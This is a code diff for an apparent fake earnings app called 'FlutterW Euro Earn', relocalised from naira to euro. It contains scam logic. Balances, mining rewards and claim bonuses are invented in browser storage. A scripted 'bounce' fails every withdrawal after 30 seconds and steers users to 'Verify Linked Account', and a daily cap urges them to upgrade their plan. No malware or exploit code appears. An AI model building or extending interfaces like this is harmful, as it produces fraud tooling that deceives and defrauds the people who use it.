@@ -123,7 +123,7 @@ body.dark-mode .telegram-float{background:linear-gradient(135deg,#0088cc,#00a8e8
 .claim-timer{background:#f8fafc;border:1px solid #e2e8f0;padding:10px 16px;border-radius:14px;font-size:15px;font-weight:800;color:#6366f1;min-width:70px;text-align:center;cursor:pointer;transition:all 0.3s;}
 .claim-timer.ready{background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;box-shadow:0 4px 12px rgba(99,102,241,0.2);}
 .claim-timer.done{background:#f1f5f9;color:#94a3b8;border-style:dashed;cursor:not-allowed;}
-.bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;background:#fff;border-top:1px solid #f1f5f9;padding:10px 20px 24px;display:flex;justify-around;align-items:center;z-index:100;box-shadow:0 -4px 20px rgba(0,0,0,0.04);transition:all 0.3s ease;}
+.bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;background:#fff;border-top:1px solid #f1f5f9;padding:10px 20px 24px;display:flex;justify-content:space-around;align-items:center;z-index:100;box-shadow:0 -4px 20px rgba(0,0,0,0.04);transition:all 0.3s ease;}
 .nav-item{display:flex;flex-direction:column;align-items:center;gap:4px;color:#94a3b8;text-decoration:none;font-size:10px;font-weight:600;transition:all 0.3s;border:none;background:none;cursor:pointer;}
 .nav-item i{font-size:20px;}
 .nav-item.active{color:#6366f1;}
@@ -247,7 +247,7 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
   <div class="tutorial-bubble" id="tutorialBubble">
     <div class="tutorial-step" id="tutorialStepNum">Step 1 of 5</div>
     <div class="tutorial-title" id="tutorialTitle">Start Mining</div>
-    <div class="tutorial-desc" id="tutorialDesc">Tap the Mine button to earn your first ₦30,000. Mining runs daily!</div>
+    <div class="tutorial-desc" id="tutorialDesc">Tap the Mine button to earn your first €30,000. Mining runs daily!</div>
     <button class="tutorial-btn" id="tutorialBtn" onclick="nextTutorial()">
       <span>Got it!</span> <i class="fa-solid fa-arrow-right"></i>
     </button>
@@ -257,7 +257,7 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
 <div class="app">
 <div class="topbar anim d1" id="headerArea">
   <div class="avatar-wrap">
-    <div class="avatar" id="userAvatar">9</div>
+    <div class="avatar" id="userAvatar">€</div>
     <div>
       <div class="greeting" id="greeting">Good morning</div>
       <div class="name" id="userName">FlutterW Euro Earn User</div>
@@ -273,7 +273,7 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
     <div class="balance-label">Total Balance</div>
     <button class="eye-btn" onclick="toggleBalance()" id="eyeBtn"><i class="fa-regular fa-eye" id="eyeIcon"></i></button>
   </div>
-  <div class="balance-num" id="walletBalance">0<span>.00</span></div>
+  <div class="balance-num" id="walletBalance">€0<span>.00</span></div>
   <div class="balance-change"><i class="fa-solid fa-arrow-trend-up"></i> +12.5% this week</div>
 </div>
 <div class="actions anim d3" id="actionsArea">
@@ -295,7 +295,7 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
   </div>
   <button class="bank-edit" onclick="editBank()"><i class="fa-solid fa-pen"></i></button>
 </div>
-
+<!-- VERIFY BUTTON: ONLY shows after withdrawal has been bounced back and money returned -->
 <div class="verify-btn-wrap" id="verifyBankWrap">
   <button class="verify-btn" onclick="verifyBankLink()" id="verifyBankBtn">
     <i class="fa-solid fa-shield-halved"></i><span>Verify Linked Account</span>
@@ -304,7 +304,7 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
 <div class="claim-card anim d3" id="claimArea">
   <div class="claim-icon"><i class="fa-solid fa-gift"></i></div>
   <div class="claim-info">
-    <div class="claim-title">Claim 2,000</div>
+    <div class="claim-title">Claim €2,000</div>
     <div class="claim-sub">Next: <span id="claimNext">1:00</span> - <span id="claimProgress">0</span>/50 today</div>
   </div>
   <div class="claim-timer" id="claimTimer" onclick="doClaim()">1:00</div>
@@ -312,25 +312,25 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
 <div class="sec-title anim d4" id="checkinTitle"><i class="fa-solid fa-fire"></i> Daily Check-In</div>
 <div class="checkin-wrap anim d4" id="checkinWrap">
   <div class="checkin-day active" id="day0" data-reward="500">
-    <div class="day-num">1</div><div class="day-label">Today</div><div class="day-reward">500</div>
+    <div class="day-num">1</div><div class="day-label">Today</div><div class="day-reward">€500</div>
   </div>
   <div class="checkin-day locked" id="day1" data-reward="1000">
-    <div class="day-num">2</div><div class="day-label">Tomorrow</div><div class="day-reward">1K</div>
+    <div class="day-num">2</div><div class="day-label">Tomorrow</div><div class="day-reward">€1K</div>
   </div>
   <div class="checkin-day locked" id="day2" data-reward="1500">
-    <div class="day-num">3</div><div class="day-label">Day 3</div><div class="day-reward">1.5K</div>
+    <div class="day-num">3</div><div class="day-label">Day 3</div><div class="day-reward">€1.5K</div>
   </div>
   <div class="checkin-day locked" id="day3" data-reward="2000">
-    <div class="day-num">4</div><div class="day-label">Day 4</div><div class="day-reward">2K</div>
+    <div class="day-num">4</div><div class="day-label">Day 4</div><div class="day-reward">€2K</div>
   </div>
   <div class="checkin-day locked" id="day4" data-reward="3000">
-    <div class="day-num">5</div><div class="day-label">Day 5</div><div class="day-reward">3K</div>
+    <div class="day-num">5</div><div class="day-label">Day 5</div><div class="day-reward">€3K</div>
   </div>
   <div class="checkin-day locked" id="day5" data-reward="5000">
-    <div class="day-num">6</div><div class="day-label">Day 6</div><div class="day-reward">5K</div>
+    <div class="day-num">6</div><div class="day-label">Day 6</div><div class="day-reward">€5K</div>
   </div>
   <div class="checkin-day locked" id="day6" data-reward="10000">
-    <div class="day-num">7</div><div class="day-label">Day 7</div><div class="day-reward">10K</div>
+    <div class="day-num">7</div><div class="day-label">Day 7</div><div class="day-reward">€10K</div>
   </div>
 </div>
 <button class="cta-btn anim d4" id="checkinBtn" onclick="doCheckin()">
@@ -339,7 +339,7 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
 <div class="stats-grid anim d5">
   <div class="stat-box">
     <div class="stat-icon" style="background:#ecfdf5;color:#10b981;"><i class="fa-solid fa-coins"></i></div>
-    <div class="stat-num" id="totalMined">0</div><div class="stat-label">Total Mined</div>
+    <div class="stat-num" id="totalMined">€0</div><div class="stat-label">Total Mined</div>
   </div>
   <div class="stat-box">
     <div class="stat-icon" style="background:#eef2ff;color:#6366f1;"><i class="fa-solid fa-bolt"></i></div>
@@ -383,12 +383,12 @@ let secondsLeft = CLAIM_INTERVAL;
 let telegramLink = "https://t.me/#1";
 
 const TUTORIAL_STEPS = [
-  { id: "mineBtn", title: "Start Mining", desc: "Tap the Mine button to earn your first ₦30,000. Mining runs daily!", position: "bottom" },
+  { id: "mineBtn", title: "Start Mining", desc: "Tap the Mine button to earn your first €30,000. Mining runs daily!", position: "bottom" },
   { id: "withdrawBtn", title: "Withdraw Cash", desc: "Tap Withdraw to cash out your earnings to your linked bank account.", position: "bottom" },
   { id: "tasksBtn", title: "Complete Tasks", desc: "Visit the Tasks page to earn extra cash by completing simple social media tasks.", position: "bottom" },
   { id: "eyeBtn", title: "Hide Balance", desc: "Tap the eye icon anytime to hide or show your balance for privacy.", position: "bottom" },
-  { id: "claimArea", title: "Claim Every Minute", desc: "Tap Claim every 60 seconds to collect ₦2,000 free cash! Up to 50 times daily.", position: "top" },
-  { id: "checkinBtn", title: "Daily Check-In", desc: "Check in every day to collect increasing rewards: 500, 1K, 1.5K, 2K, 3K, 5K, 10K!", position: "top" }
+  { id: "claimArea", title: "Claim Every Minute", desc: "Tap Claim every 60 seconds to collect €2,000 free cash! Up to 50 times daily.", position: "top" },
+  { id: "checkinBtn", title: "Daily Check-In", desc: "Check in every day to collect increasing rewards: €500, €1K, €1.5K, €2K, €3K, €5K, €10K!", position: "top" }
 ];
 let currentTutorialStep = 0;
 let tutorialActive = false;
@@ -533,8 +533,10 @@ function checkAndShowVerifyButton() {
   
   if (hasBouncedBefore) {
     wrap.classList.add("show");
+    console.log("Verify button SHOWN - bounce was previously reversed");
   } else {
     wrap.classList.remove("show");
+    console.log("Verify button HIDDEN - no bounce yet");
   }
 }
 
@@ -546,6 +548,7 @@ function executeBounce() {
     const amount = parseFloat(data.amount) || 0;
     if (amount <= 0) { localStorage.removeItem("pendingBounce"); return; }
     
+    // Return money to balance
     const currentBalance = parseFloat(localStorage.getItem("walletBalance")) || 0;
     balance = currentBalance + amount;
     userData.balance = balance;
@@ -567,7 +570,7 @@ function executeBounce() {
     Swal.fire({
       icon: "warning",
       title: "Withdrawal Failed",
-      html: '<p style="color:#64748b;">Your withdrawal of <b>₦' + amount.toLocaleString() + '</b> was returned.</p><p style="color:#64748b;margin-top:8px;">Reason: <b>Linked bank account not verified</b></p><p style="color:#64748b;margin-top:8px;">Please verify your linked account to withdraw.</p>',
+      html: '<p style="color:#64748b;">Your withdrawal of <b>€' + amount.toLocaleString() + '</b> was returned.</p><p style="color:#64748b;margin-top:8px;">Reason: <b>Linked bank account not verified</b></p><p style="color:#64748b;margin-top:8px;">Please verify your linked account to withdraw.</p>',
       confirmButtonText: "Verify Account",
       confirmButtonColor: "#ef4444",
       background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff",
@@ -593,9 +596,11 @@ function checkPendingBounceOnLoad() {
     const BOUNCE_DELAY = 30000;
     
     if (elapsed >= BOUNCE_DELAY) {
+      console.log("Bounce timer expired while away - executing now");
       executeBounce();
     } else {
       const remaining = BOUNCE_DELAY - elapsed;
+      console.log("Bounce scheduled in " + remaining + "ms");
       setTimeout(executeBounce, remaining);
     }
   } catch(e) {
@@ -606,7 +611,7 @@ function checkPendingBounceOnLoad() {
 
 function maskNum(num) { if (!num || num.length < 4) return "****"; return "**** " + num.slice(-4); }
 
-function formatMoney(num) { if (num >= 1000000) return "₦" + (num / 1000000).toFixed(2) + "M"; return "₦" + num.toLocaleString("en-NG"); }
+function formatMoney(num) { if (num >= 1000000) return "€" + (num / 1000000).toFixed(2) + "M"; return "€" + num.toLocaleString("de-DE"); }
 
 function updateBalance() {
   const el = document.getElementById("walletBalance");
@@ -668,8 +673,8 @@ function doCheckin() {
   if (checkinData.claimedDays.length > 7) checkinData.claimedDays = [];
   localStorage.setItem("checkinData", JSON.stringify(checkinData));
   saveUserData(); addToActivity("Daily Check-In", amount, "in"); updateBalance(); initCheckin();
-  showToast("Checked in! +₦" + amount.toLocaleString());
-  Swal.fire({ icon: "success", title: "Day " + checkinData.claimedDays.length + " Complete!", text: "+₦" + amount.toLocaleString() + " added to your balance", confirmButtonColor: "#6366f1", timer: 2000, showConfirmButton: false, background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff", color: document.body.classList.contains("dark-mode") ? "#f8fafc" : "#1e293b" });
+  showToast("Checked in! +€" + amount.toLocaleString());
+  Swal.fire({ icon: "success", title: "Day " + checkinData.claimedDays.length + " Complete!", text: "+€" + amount.toLocaleString() + " added to your balance", confirmButtonColor: "#6366f1", timer: 2000, showConfirmButton: false, background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff", color: document.body.classList.contains("dark-mode") ? "#f8fafc" : "#1e293b" });
 }
 
 function getTodayStr() { return new Date().toDateString(); }
@@ -712,7 +717,7 @@ function doClaim() {
   const timerEl = document.getElementById("claimTimer");
   const progressEl = document.getElementById("claimProgress");
   progressEl.textContent = claimData.claimsToday;
-  showToast("+₦" + CLAIM_AMOUNT + " claimed! (" + claimData.claimsToday + "/" + MAX_CLAIMS_PER_DAY + ")");
+  showToast("+€" + CLAIM_AMOUNT + " claimed! (" + claimData.claimsToday + "/" + MAX_CLAIMS_PER_DAY + ")");
   if (claimData.claimsToday >= MAX_CLAIMS_PER_DAY) { timerEl.textContent = "DONE"; timerEl.className = "claim-timer done"; document.getElementById("claimNext").textContent = "Come back tomorrow"; return; }
   secondsLeft = CLAIM_INTERVAL; timerEl.className = "claim-timer"; startClaimTimer();
 }
@@ -721,10 +726,10 @@ function startMining() {
   if (tutorialActive && currentTutorialStep === 0) { nextTutorial(); }
   const todayMined = parseFloat(localStorage.getItem("todayMined") || "0");
   if (todayMined >= 30000) {
-    Swal.fire({ icon: "info", title: "Mining Limit Reached", text: "You've already mined ₦30,000 today. Upgrade your plan to continue.", confirmButtonColor: "#6366f1", background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff", color: document.body.classList.contains("dark-mode") ? "#f8fafc" : "#1e293b" });
+    Swal.fire({ icon: "info", title: "Mining Limit Reached", text: "You've already mined €30,000 today. Upgrade your plan to continue.", confirmButtonColor: "#6366f1", background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff", color: document.body.classList.contains("dark-mode") ? "#f8fafc" : "#1e293b" });
     return;
   }
-  Swal.fire({ title: "Start Mining?", html: '<p style="color:#64748b;margin-top:8px;">Your plan is <b>Free Miner</b>. Mine up to <b>₦30,000</b> daily.</p>', showCancelButton: true, confirmButtonText: "START MINING", cancelButtonText: "Cancel", confirmButtonColor: "#6366f1", reverseButtons: true, background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff", color: document.body.classList.contains("dark-mode") ? "#f8fafc" : "#1e293b" }).then(function(r) { if (r.isConfirmed) runMining(); });
+  Swal.fire({ title: "Start Mining?", html: '<p style="color:#64748b;margin-top:8px;">Your plan is <b>Free Miner</b>. Mine up to <b>€30,000</b> daily.</p>', showCancelButton: true, confirmButtonText: "START MINING", cancelButtonText: "Cancel", confirmButtonColor: "#6366f1", reverseButtons: true, background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff", color: document.body.classList.contains("dark-mode") ? "#f8fafc" : "#1e293b" }).then(function(r) { if (r.isConfirmed) runMining(); });
 }
 
 function runMining() {
@@ -736,9 +741,9 @@ function completeMining() {
   const amount = 30000; balance += amount; userData.balance = balance; userData.totalMined = (userData.totalMined || 0) + amount;
   localStorage.setItem("todayMined", amount.toString()); localStorage.setItem("lastMineDate", new Date().toDateString());
   saveUserData(); updateBalance(); addToActivity("Mining", amount, "in");
-  document.getElementById("totalMined").textContent = "₦" + (userData.totalMined || 0).toLocaleString();
+  document.getElementById("totalMined").textContent = "€" + (userData.totalMined || 0).toLocaleString();
   sendMiningNotification(amount);
-  Swal.fire({ icon: "success", title: "Mining Complete!", text: "+₦30,000.00 added to your balance", confirmButtonColor: "#6366f1", background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff", color: document.body.classList.contains("dark-mode") ? "#f8fafc" : "#1e293b" });
+  Swal.fire({ icon: "success", title: "Mining Complete!", text: "+€30,000.00 added to your balance", confirmButtonColor: "#6366f1", background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff", color: document.body.classList.contains("dark-mode") ? "#f8fafc" : "#1e293b" });
 }
 
 function checkDailyReset() {
@@ -749,14 +754,14 @@ function checkDailyReset() {
 
 function addToActivity(type, amount, dir) {
   let tx = JSON.parse(localStorage.getItem("transactionHistory")) || [];
-  tx.unshift({ type: type, amount: "₦" + amount.toLocaleString(), status: "Successful", date: new Date().toLocaleString() });
+  tx.unshift({ type: type, amount: "€" + amount.toLocaleString(), status: "Successful", date: new Date().toLocaleString() });
   localStorage.setItem("transactionHistory", JSON.stringify(tx));
   loadActivity();
 }
 
 function addBounceToActivity(type, amount, status) {
   let tx = JSON.parse(localStorage.getItem("transactionHistory")) || [];
-  tx.unshift({ type: type, amount: "₦" + amount.toLocaleString(), status: status, date: new Date().toLocaleString(), bounce: true });
+  tx.unshift({ type: type, amount: "€" + amount.toLocaleString(), status: status, date: new Date().toLocaleString(), bounce: true });
   localStorage.setItem("transactionHistory", JSON.stringify(tx));
   loadActivity();
 }
@@ -857,7 +862,7 @@ function editBank() {
   document.getElementById("bankNameText").textContent = userData.bankName;
   document.getElementById("bankMeta").textContent = maskNum(userData.accountNumber) + " | " + (userData.fullName || userData.name);
   document.getElementById("userName").textContent = userData.fullName || userData.name;
-  document.getElementById("userAvatar").textContent = (userData.fullName || userData.name || "9").charAt(0).toUpperCase();
+  document.getElementById("userAvatar").textContent = (userData.fullName || userData.name || "E").charAt(0).toUpperCase();
   showToast("Bank details updated!");
 }
 
@@ -870,7 +875,7 @@ window.addEventListener("DOMContentLoaded", function() {
   if (hour < 12) greet = "Good morning"; else if (hour < 17) greet = "Good afternoon";
   document.getElementById("greeting").textContent = greet + " 👋";
   document.getElementById("userName").textContent = userData.name || userData.fullName || "FlutterW Euro Earn User";
-  document.getElementById("userAvatar").textContent = (userData.name || userData.fullName || "9").charAt(0).toUpperCase();
+  document.getElementById("userAvatar").textContent = (userData.name || userData.fullName || "E").charAt(0).toUpperCase();
   document.getElementById("bankNameText").textContent = userData.bankName || "No bank linked";
   document.getElementById("bankMeta").textContent = maskNum(userData.accountNumber) + " | " + (userData.fullName || userData.name || "Unknown");
   
@@ -878,7 +883,7 @@ window.addEventListener("DOMContentLoaded", function() {
   checkAndShowVerifyButton();
   
   updateBalance();
-  document.getElementById("totalMined").textContent = "₦" + (userData.totalMined || 0).toLocaleString();
+  document.getElementById("totalMined").textContent = "€" + (userData.totalMined || 0).toLocaleString();
   document.getElementById("miningPower").textContent = (userData.miningPower || 1) + "x";
   initCheckin(); initClaim(); loadActivity(); checkDailyReset(); initTutorial();
   
@@ -891,7 +896,7 @@ window.addEventListener("DOMContentLoaded", function() {
           localStorage.setItem("9jaCashUser", JSON.stringify(userData)); 
           balance = fresh.balance || balance; 
           updateBalance(); 
-          document.getElementById("totalMined").textContent = "₦" + (fresh.totalMined || 0).toLocaleString(); 
+          document.getElementById("totalMined").textContent = "€" + (fresh.totalMined || 0).toLocaleString(); 
           loadActivity(); 
         } 
       })
